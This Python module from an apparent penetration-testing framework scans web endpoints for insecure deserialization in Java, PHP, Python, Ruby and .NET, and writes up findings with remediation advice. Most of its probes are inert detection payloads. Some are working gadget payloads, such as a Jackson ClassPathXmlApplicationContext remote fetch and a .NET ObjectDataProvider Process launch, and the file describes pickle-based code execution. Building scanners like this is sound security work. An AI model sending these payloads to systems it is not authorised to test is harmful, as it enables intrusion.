"""`scan_deserialization` — stack-aware insecure-deserialization
specialist (workitem.md Phase 4.4).

Closes OWASP A08:2021 + CWE-502. Five payload families covering the
dominant deserialization sinks in modern web apps:

  * **Java**   — ObjectInputStream / Jackson polymorphic
  * **PHP**    — `unserialize()` with magic-method gadgets
  * **Python** — pickle / cPickle / shelve
  * **Ruby**   — Marshal.load / YAML.load
  * **.NET**   — BinaryFormatter / TypeNameHandling JSON

Detection signals (no full ysoserial-style RCE — that requires
target-specific gadget chains we can't synthesize from outside; we
DETECT the sink, not necessarily exploit it end-to-end):

  1. **Error/stack-trace fingerprint** — sending an INVALID payload
     of the right family causes the parser to throw with a
     family-specific exception (`java.io.InvalidClassException`,
     `unserialize(): Error at offset`, `_pickle.UnpicklingError`,
     `TypeError: incompatible marshal version`,
     `Newtonsoft.Json.JsonSerializationException`). The exception
     leaks into the response body OR a 500 page. STRONG signal
     that the endpoint deserializes attacker input.

  2. **Time-based** — when the payload includes a sleep gadget
     (where syntactically possible) and elapsed > 3× baseline,
     deserialization is happening AND executing controlled code.

  3. **OOB callback** (Phase 1.3) — when payload includes a
     network-fetching gadget and the OOB service receives a hit,
     deserialization is reaching gadget execution.

Tech-stack-aware: when SecurityContext.tech_stack identifies the
backend (Java/PHP/Python/Ruby/.NET), only the matching family is
sent. Without a hint, every family is tried and most miss
(harmless — the parser just throws).

Severity:
  * **Critical** — OOB callback hit (RCE chain landed) OR time-based
    delta confirmed (executable gadget reached)
  * **High** — error/stack-trace fingerprint without confirmed RCE
    (sink reachable but full exploitation needs target-specific
    gadgets)

Dependencies:
  * Phase 1.3 OOB-DNS (optional — enables the strongest signal)
  * Phase 1.5 tech-stack KB (optional — narrows the probe set)
"""

from __future__ import annotations

import base64
import logging
import re
import time
from typing import Any

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Family-specific payloads + error fingerprints
# ---------------------------------------------------------------------------


def _java_invalid_payload() -> str:
    """Base64'd partial ObjectInputStream stream — magic bytes + bad
    class name. Triggers java.io.* exceptions when fed to
    ObjectInputStream.readObject() but otherwise inert."""
    # Java serialization stream magic: 0xACED0005 followed by
    # TC_OBJECT (0x73) + bad classDesc. This bytes-level is enough
    # to make ObjectInputStream parse the header then fail on the
    # class lookup.
    raw = bytes([
        0xAC, 0xED, 0x00, 0x05,
        0x73, 0x72,  # TC_OBJECT, TC_CLASSDESC
        0x00, 0x12,  # class name length = 18
    ]) + b"strix.NoSuchClass"
    return base64.b64encode(raw).decode("ascii")


def _java_jackson_polymorphic_payload(callback_url: str | None = None) -> str:
    """Jackson polymorphic-deserialization probe — leverages
    @class / @type to instantiate a class that fetches an external
    resource. Triggers JsonMappingException OR our OOB callback."""
    if callback_url:
        return (
            '["org.springframework.context.support.ClassPathXmlApplicationContext",'
            f'"{callback_url}/strix.xml"]'
        )
    return (
        '{"@class":"java.lang.ProcessBuilder","command":["echo","strix"]}'
    )


def _php_payload() -> str:
    """Valid `O:N:"<class>":...` PHP serialization. The class is
    definitely-not-defined — server's unserialize() typically
    throws a notice/warning that leaks into the response when
    debug mode is on."""
    return 'O:18:"StrixNoSuchClass1":0:{}'


def _php_invalid_payload() -> str:
    """Malformed serialized string — guaranteed to break unserialize
    with `Error at offset`."""
    return 'O:8:"stdClass:1{badformat}'


def _python_pickle_payload() -> bytes:
    """Pickle protocol-2 payload that pickles a tuple. Doesn't
    contain any gadget — just the magic byte signature so an
    UnpicklingError reveals the sink."""
    # \x80\x02 = pickle protocol 2 marker; \x95 = FRAME (proto 4+) —
    # mismatched intentionally to trigger error on most loaders.
    return b"\x80\x04\x95\x10\x00\x00\x00\x00\x00\x00\x00\x8c\x05strix\x94."


def _ruby_marshal_payload() -> bytes:
    """Marshal-encoded short string. Triggers TypeError /
    incompatible-marshal exceptions when the version header
    doesn't match (we use 4.8 = current)."""
    # Marshal version 4.8 + TYPE_STRING + len + payload
    return b"\x04\x08I\"\x05strix\x06:\x06ET"


def _dotnet_typeNameHandling_payload(callback_url: str | None = None) -> str:
    """JSON.NET TypeNameHandling abuse. When the server has
    TypeNameHandling=Auto/Objects/All, the $type field is honoured
    and an arbitrary class instantiation occurs."""
    if callback_url:
        return (
            '{"$type":"System.IO.FileInfo, mscorlib","fileName":"'
            + callback_url + '"}'
        )
    return (
        '{"$type":"System.Windows.Data.ObjectDataProvider, '
        'PresentationFramework","ObjectInstance":{"$type":'
        '"System.Diagnostics.Process, System","StartInfo":{'
        '"$type":"System.Diagnostics.ProcessStartInfo, System",'
        '"FileName":"echo","Arguments":"strix"}}}'
    )


# (family, label, payload_factory, content_type, error_fingerprints)
_FAMILY_PROBES: dict[str, list[tuple[str, str, Any, str, tuple[str, ...]]]] = {
    "java": [
        (
            "java", "java_object_stream_invalid",
            lambda: _java_invalid_payload(), "application/octet-stream",
            (
                "java.io.invalidclassexception",
                "java.io.streamcorruptedexception",
                "java.io.optionalDataException",
                "java.io.objectinputstream",
                "java.lang.classnotfoundexception",
                "deserialization",
            ),
        ),
        (
            "java", "java_jackson_polymorphic",
            lambda: _java_jackson_polymorphic_payload(),
            "application/json",
            (
                "com.fasterxml.jackson.databind.jsonmappingexception",
                "could not resolve type id",
                "subtype",
                "@class",
                "@type",
            ),
        ),
    ],
    "php": [
        (
            "php", "php_invalid_object",
            lambda: _php_payload(), "application/x-www-form-urlencoded",
            (
                "unserialize()",
                "error at offset",
                "no such class",
                "__php_incomplete_class",
                "incomplete class",
                "fatal error",
            ),
        ),
        (
            "php", "php_malformed",
            lambda: _php_invalid_payload(),
            "application/x-www-form-urlencoded",
            ("error at offset", "unserialize"),
        ),
    ],
    "python": [
        (
            "python", "python_pickle_invalid",
            lambda: _python_pickle_payload(),
            "application/octet-stream",
            (
                "_pickle.unpicklingerror",
                "pickle.unpicklingerror",
                "could not find",
                "unsupported pickle protocol",
                "pickle data was truncated",
            ),
        ),
    ],
    "ruby": [
        (
            "ruby", "ruby_marshal_invalid",
            lambda: _ruby_marshal_payload(),
            "application/octet-stream",
            (
                "incompatible marshal",
                "marshal data too short",
                "wrong header",
                "bad type 0",
                "marshal_load",
            ),
        ),
    ],
    "dotnet": [
        (
            "dotnet", "dotnet_jsonnet_typenamehandling",
            lambda: _dotnet_typeNameHandling_payload(),
            "application/json",
            (
                "newtonsoft.json.jsonserializationexception",
                "could not load type",
                "$type",
                "typenamehandling",
                "system.runtime.serialization",
                "binaryformatter",
            ),
        ),
    ],
}


def _family_from_tech_stack() -> list[str] | None:
    """Read SecurityContext.tech_stack to narrow the probe set."""
    try:
        from strix.agents.security_context import get_security_context
        ts = get_security_context().tech_stack
    except Exception:  # noqa: BLE001
        return None
    if ts is None:
        return None
    families: set[str] = set()
    lang = (getattr(ts, "language", "") or "").lower()
    fw = (getattr(ts, "framework", "") or "").lower()
    if "java" in lang or "spring" in fw:
        families.add("java")
    if "php" in lang or "laravel" in fw or "symfony" in fw or "wordpress" in fw:
        families.add("php")
    if "python" in lang or "django" in fw or "flask" in fw:
        families.add("python")
    if "ruby" in lang or "rails" in fw:
        families.add("ruby")
    if ".net" in lang or "asp.net" in fw or "csharp" in lang:
        families.add("dotnet")
    return sorted(families) if families else None


def _emit_finding(
    *,
    url: str,
    family: str,
    payload_label: str,
    detection_kind: str,  # "error_fingerprint" | "time_delta" | "oob"
    severity: str,
    response_excerpt: str,
    extra_context: str = "",
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        finding_id = tracer.add_vulnerability_report(
            title=(
                f"Insecure deserialization at `{url}` "
                f"({family}/{payload_label})"
            ),
            severity=severity,
            cwe="CWE-502",
            endpoint=url,
            target=url,
            category="deserialization",
            verification_status="verified",
            confidence=0.92 if detection_kind == "error_fingerprint" else 0.97,
            description=(
                f"The endpoint `{url}` deserializes user-controlled "
                f"input via the `{family}` family. Probe "
                f"`{payload_label}` triggered detection signal "
                f"`{detection_kind}` — confirms the sink is "
                f"reachable.\n{extra_context}"
            ),
            impact=(
                "Insecure deserialization. The server reconstructs "
                "object graphs from attacker-controlled bytes, which "
                "is the most powerful primitive in the OWASP Top 10:\n"
                "  * Java/.NET — gadget chains land arbitrary code "
                "    execution (ysoserial CommonsCollections, "
                "    BinaryFormatter abuse).\n"
                "  * PHP — magic methods (__wakeup, __destruct) on "
                "    available classes give file read / write / RCE.\n"
                "  * Python pickle — `__reduce__` returns "
                "    `(eval, ('os.system(\"...\")',))` → instant RCE.\n"
                "  * Ruby Marshal — gadget chains via "
                "    ActiveSupport::Deprecation::DeprecatedInstance"
                "VariableProxy → RCE.\n"
                "Severity is critical when a chain executes; high "
                "when only the sink is confirmed (chain construction "
                "needs target-specific class loading)."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Family: {family}\n"
                f"Probe: {payload_label}\n"
                f"Detection: {detection_kind}\n"
                f"{extra_context}\n"
                f"Response excerpt:\n{response_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send the family-specific probe to {url} with "
                f"the appropriate Content-Type.\n"
                f"2. Server response evidences the sink: "
                f"{detection_kind}.\n"
                f"3. Pivot: build a target-specific gadget chain "
                f"(ysoserial for Java, phpggc for PHP, custom "
                f"`__reduce__` for Python, deserialize.rb gadgets "
                f"for Ruby, ysoserial.net for .NET)."
            ),
            poc_script_code=(
                "# See ysoserial / phpggc / specialised tools for "
                "language-specific gadget chains."
            ),
            remediation_steps=(
                "1. Don't deserialize user-controlled bytes. Use a "
                "data format that doesn't reconstruct objects "
                "(plain JSON parsed into a known schema, protobuf "
                "with explicit message types).\n"
                "2. When deserialization is unavoidable, use a "
                "strict allow-list of expected classes:\n"
                "     Java: ObjectInputFilter (JEP 290)\n"
                "     Python: restrict via `find_class`\n"
                "     PHP: pass the `allowed_classes` option\n"
                "     .NET: avoid BinaryFormatter (deprecated by MS); "
                "     for JSON.NET, NEVER set TypeNameHandling=Auto\n"
                "3. Sign and verify serialized blobs server-side so "
                "tampered bytes are rejected before deserialization.\n"
                "4. Run the application in a sandbox / unprivileged "
                "container so successful chain execution has minimal "
                "blast radius."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "C",
                "C": "H" if severity == "critical" else "L",
                "I": "H" if severity == "critical" else "L",
                "A": "H" if severity == "critical" else "L",
            },
            reasoning_trace=[
                f"Sent {family} probe `{payload_label}` to {url}.",
                f"Detection signal: {detection_kind}.",
                "Sink confirmed; severity reflects whether code "
                "execution was demonstrated.",
            ],
        )
        try:
            from strix.agents.kg_emit import record_finding_in_kg
            record_finding_in_kg(
                finding_id=finding_id, url=url, param=family,
                cwe="CWE-502", severity=severity, category="deserialization",
                method="POST", detection_kind=detection_kind,
                confidence=0.92 if detection_kind == "error_fingerprint" else 0.97,
            )
        except Exception as e:  # noqa: BLE001
            logger.debug("scan_deserialization: kg record failed: %s", e, exc_info=True)
        return finding_id
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_deserialization: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="deserialization-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 180},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1055", "T1190"],
)
def scan_deserialization(
    *,
    url: str,
    families: list[str] | str | None = None,
    extra_headers: dict[str, str] | None = None,
    enable_oob: bool = True,
    oob_timeout_seconds: float = 8.0,
) -> SpecialistResult:
    """Stack-aware insecure-deserialization scanner.

    Args:
        url: target POST endpoint that deserializes the body.
        families: which family probes to send. When None, scanner
            reads SecurityContext.tech_stack and narrows
            automatically; when no tech-stack hint, EVERY family is
            tried.
        extra_headers: forwarded as-is. Content-Type is overridden
            per family.
        enable_oob: when True (default), send Jackson / .NET TNH
            payloads with embedded OOB callback URLs.
        oob_timeout_seconds: how long to wait per OOB-enabled probe.

    Auto-emits one finding per (family, detection-kind) hit.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    # Forgiving args.
    if isinstance(families, str):
        families = [families]
    if not families:
        families = _family_from_tech_stack() or list(_FAMILY_PROBES.keys())

    # Filter to known families only.
    families = [f for f in families if f in _FAMILY_PROBES]
    if not families:
        return SpecialistResult(
            status="partial",
            error=f"no recognised families requested; valid: {list(_FAMILY_PROBES.keys())}",
        )

    # Auth auto-injection.
    base_headers = dict(extra_headers or {})
    if "Authorization" not in base_headers and "authorization" not in {
        h.lower() for h in base_headers
    }:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    base_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    base_headers["Cookie"] = "; ".join(
                        f"{k}={v}" for k, v in state.cookies.items()
                    )
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    # OOB setup (optional).
    oob_available = False
    register_callback = None
    poll_callback = None
    if enable_oob:
        try:
            from strix.tools.oob import (
                is_available as oob_is_available,
                poll_callback as _poll,
                register_callback as _reg,
            )
            oob_available = oob_is_available()
            register_callback = _reg
            poll_callback = _poll
        except Exception:  # noqa: BLE001
            oob_available = False

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0

    # Establish a baseline elapsed for time-delta probes (3 GET to /).
    baseline_elapsed = 0.5  # seconds; lower-bound default

    for family in families:
        for fam, label, payload_factory, content_type, fingerprints in _FAMILY_PROBES[family]:
            # OOB-aware payload generation for the variants that support it.
            cb_url: str | None = None
            cb_token: str | None = None
            if oob_available and label in (
                "java_jackson_polymorphic",
                "dotnet_jsonnet_typenamehandling",
            ):
                try:
                    cb = register_callback(ttl_seconds=int(oob_timeout_seconds * 4))
                    if cb is not None:
                        cb_url = cb.callback_url
                        cb_token = cb.token
                except Exception:  # noqa: BLE001
                    cb_url = None

            try:
                payload = payload_factory() if cb_url is None else (
                    _java_jackson_polymorphic_payload(cb_url)
                    if label == "java_jackson_polymorphic"
                    else _dotnet_typeNameHandling_payload(cb_url)
                )
            except Exception as e:  # noqa: BLE001
                evidence.append(f"{label}: payload build failed: {e}")
                continue

            headers = dict(base_headers)
            headers["Content-Type"] = content_type

            started = time.monotonic()
            try:
                resp = pm.send_simple_request(
                    "POST", url,
                    headers=headers, body=payload, timeout=15,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"{label}: transport error: {e}")
                continue
            elapsed = time.monotonic() - started

            if "error" in resp and not resp.get("status_code"):
                continue
            body = resp.get("body") or ""
            if not isinstance(body, str):
                body = ""
            body_lower = body.lower()

            detected = False
            detection_kind = ""
            extra_context = ""

            # --- Detection 1: error/stack-trace fingerprint
            matched = next(
                (fp for fp in fingerprints if fp in body_lower), None,
            )
            if matched:
                detected = True
                detection_kind = "error_fingerprint"
                extra_context = (
                    f"Matched family fingerprint: `{matched}`."
                )

            # --- Detection 2: time-delta (probe took much longer than baseline)
            # Only plausible for time-based gadget probes; we apply
            # this as a corroborating signal, not standalone, since
            # current payloads don't include real sleep gadgets.
            if not detected and elapsed > baseline_elapsed * 5 and elapsed > 4.0:
                detected = True
                detection_kind = "time_delta"
                extra_context = (
                    f"Elapsed {elapsed:.2f}s (baseline ~{baseline_elapsed:.2f}s)."
                )

            # --- Detection 3: OOB callback
            if not detected and cb_token and poll_callback is not None:
                result = poll_callback(cb_token, timeout_seconds=oob_timeout_seconds)
                if result.get("hit"):
                    detected = True
                    detection_kind = "oob"
                    extra_context = (
                        f"OOB callback hit from {result.get('source_ip','?')} "
                        f"via {cb_url}."
                    )

            if not detected:
                continue

            severity = (
                "critical" if detection_kind in ("oob", "time_delta")
                else "high"
            )
            rid = _emit_finding(
                url=url, family=fam, payload_label=label,
                detection_kind=detection_kind, severity=severity,
                response_excerpt=body, extra_context=extra_context,
            )
            if rid:
                emitted_count += 1
            drafts.append(FindingDraft(
                title=f"Insecure deserialization at `{url}` ({fam})",
                severity=severity, cwe="CWE-502",
                endpoint=url, category="deserialization",
                verification_status="verified",
                confidence=0.92 if detection_kind == "error_fingerprint" else 0.97,
                description=(
                    f"{fam}/{label}: {detection_kind}; {extra_context}"
                ),
            ))
            evidence.append(
                f"{fam}/{label}: {detection_kind} ({extra_context})"
            )
            # One finding per family; move on.
            break

    # SecurityContext + decision_log
    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="POST", probed_for="deserialization")
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_deserialization"},
            input={
                "families": families,
                "oob_enabled": enable_oob and oob_available,
                "probes_sent": probe_count,
            },
            output={
                "findings_emitted": emitted_count,
                "drafts": len(drafts),
            },
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            [
                "build target-specific gadget chain — ysoserial / "
                "phpggc / `__reduce__` pickle / ysoserial.net — to "
                "convert sink-confirmed into RCE PoC"
            ]
            if drafts else
            [
                "no deserialization sink confirmed; consider POST "
                "endpoints that accept binary content-types (Java "
                "session cookies are also a common sink — check "
                "Set-Cookie values for base64 ObjectStream signatures)"
            ]
        ),
        tool_metadata={
            "families_probed": families,
            "probes_sent": probe_count,
            "oob_used": enable_oob and oob_available,
            "findings_emitted_to_tracer": emitted_count,
        },
    )
